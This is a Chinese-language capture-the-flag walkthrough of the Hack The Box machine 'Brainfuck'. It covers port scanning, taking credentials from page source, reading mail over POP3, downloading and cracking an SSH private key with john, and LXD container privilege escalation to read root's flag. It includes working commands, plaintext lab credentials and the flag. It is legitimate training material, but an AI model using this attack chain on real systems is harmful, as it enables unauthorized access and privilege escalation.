```bash
└─# IP=10.10.10.17 
└─# nmap -sC -sV -O  $IP -oA nmap.txt -p `nmap -sS -sU -PN -p- $IP --min-rate=8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)
|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)
|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES UIDL USER TOP CAPA PIPELINING AUTH-RESP-CODE SASL(PLAIN)
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS listed ID OK ENABLE post-login LITERAL+ more have capabilities IDLE IMAP4rev1 Pre-login AUTH=PLAINA0001 SASL-IR
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_http-server-header: nginx/1.10.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-title: Welcome to nginx!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (92%), Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 5.1 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
└─# echo '10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb' >> /etc/hosts
```



kali无法请求Google的api，无法显示网站主页，端口转发出来也失败了

```
nc -lp 443 -c "nc 10.10.10.17 443"
```



```
查看页面源代码，修改密码的type类型为text成功显示密码。

orestis/kHGuERB29DNiNE
```

```
telnet 10.10.10.17 110
> USER orestis 
> PASS kHGuERB29DNiNE
> LIST
> RETR 1
> RETR 2
```



```bash
└─# curl https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -k -o id_rsa
```



```
python /usr/share/john/ssh2john.py id_rsa   
john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
```



```
└─# john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
3poulakia!       (id_rsa)     
```



```
chmod 400 id_rsa
ssh -i id_rsa orestis@10.10.10.17
```



LXD/LXC容器提权

> LXD 是基于 LXC 容器技术实现的轻量级容器管理程序，而 LXC 是 Linux 系统自带的容器。提权原理与 Docker 提权非常相似，本质都是利用用户创建一个容器，在容器中挂载宿主机的磁盘后使用容器的权限操作宿主机磁盘修改敏感文件，比如`/etc/passwd`、`/root/.ssh/authorized_keys`、`/etc/sudoers`等，从而完成提权。

```bash
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

```http
https://www.exploit-db.com/exploits/46978
https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
https://www.hackingarticles.in/lxd-privilege-escalation/
```



kali操作

```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```



靶机操作

```
wget http://10.10.16.3:8888/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

```
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
```

```
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

```bash
~ # cd /mnt/root/root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
6efc1a5dbb8904751ce6566a305bb8ef
```



[HTB-靶机-Brainfuck - 皇帽讲绿帽带法技巧 - 博客园 (cnblogs.com)](https://www.cnblogs.com/autopwn/p/13920542.html)

[HTB靶机渗透系列之Brainfuck - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/352833.html)


